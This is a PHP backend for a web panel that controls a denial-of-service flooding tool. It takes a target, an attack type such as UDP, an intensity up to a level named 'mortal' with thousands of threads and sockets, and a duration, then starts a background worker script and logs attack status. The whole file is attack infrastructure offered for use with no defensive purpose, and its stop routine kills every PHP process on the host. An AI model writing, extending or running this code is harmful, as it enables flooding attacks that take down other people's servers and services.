<?php
header('Content-Type: application/json; charset=utf-8');
set_time_limit(0);

$action = $_POST['action'] ?? $_GET['action'] ?? '';
$dir = __DIR__ . '/runtime';
if (!is_dir($dir)) mkdir($dir, 0755, true);

$pidFile = "$dir/attack.pid";
$logFile = "$dir/attack.log";
$cfgFile = "$dir/attack.cfg";

function out($d) { echo json_encode($d, JSON_UNESCAPED_UNICODE); exit; }

if ($action === 'status') {
    $running = false; $pid = null;
    if (file_exists($pidFile)) {
        $pid = (int)file_get_contents($pidFile);
        if ($pid > 0) {
            $check = trim(shell_exec("ps -p $pid -o pid= 2>/dev/null"));
            $running = (bool)$check;
            if (!$running) @unlink($pidFile);
        }
    }
    $log = file_exists($logFile) ? file_get_contents($logFile) : '';
    out(['running'=>$running,'pid'=>$pid,'log'=>$log]);
}

if ($action === 'stop') {
    if (file_exists($pidFile)) {
        $pid = (int)file_get_contents($pidFile);
        if ($pid > 0) {
            exec("kill -9 $pid 2>/dev/null");
            exec("pkill -9 -P $pid 2>/dev/null");
            exec("killall -9 php 2>/dev/null"); // nuke any leftover workers
        }
        @unlink($pidFile);
    }
    $prev = file_exists($logFile) ? file_get_contents($logFile) : '';
    file_put_contents($logFile, $prev . "\n[!] ATAQUE DETENIDO\n");
    out(['ok'=>true]);
}

if ($action === 'start') {
    if (file_exists($pidFile)) {
        $pid = (int)file_get_contents($pidFile);
        $check = trim(shell_exec("ps -p $pid -o pid= 2>/dev/null"));
        if ($check) out(['ok'=>false,'msg'=>'already running']);
    }

    $target    = trim($_POST['target'] ?? '');
    $type      = $_POST['type'] ?? 'udp';
    $intensity = $_POST['intensity'] ?? 'media';
    $duration  = max(1, (int)($_POST['duration'] ?? 30));
    $unit      = $_POST['unit'] ?? 's';
    if (!$target) out(['ok'=>false,'msg'=>'empty target']);

    $seconds = $duration;
    if ($unit === 'm') $seconds *= 60;
    if ($unit === 'h') $seconds *= 3600;

    // MAX POWER MAP
    $map = [
        'suave'    => [50,   80,   2048],
        'baja'     => [150,  200,  4096],
        'media'    => [400,  500,  8192],
        'alta'     => [900,  900,  16384],
        'bastante' => [1800, 1600, 32768],
        'mortal'   => [3500, 2500, 65536],
    ];
    [$threads, $sockets, $size] = $map[$intensity] ?? $map['media'];

    file_put_contents($logFile, '');
    file_put_contents($cfgFile, json_encode(compact('target','type','intensity','seconds','threads','sockets','size')));

    $worker = __DIR__ . '/worker.php';
    $cmd = 'php ' . escapeshellarg($worker) . ' > /dev/null 2>&1 & echo $!';
    $pid = (int)trim(shell_exec($cmd));
    file_put_contents($pidFile, $pid);
    out(['ok'=>true,'pid'=>$pid]);
}

out(['ok'=>false,'msg'=>'unknown']);
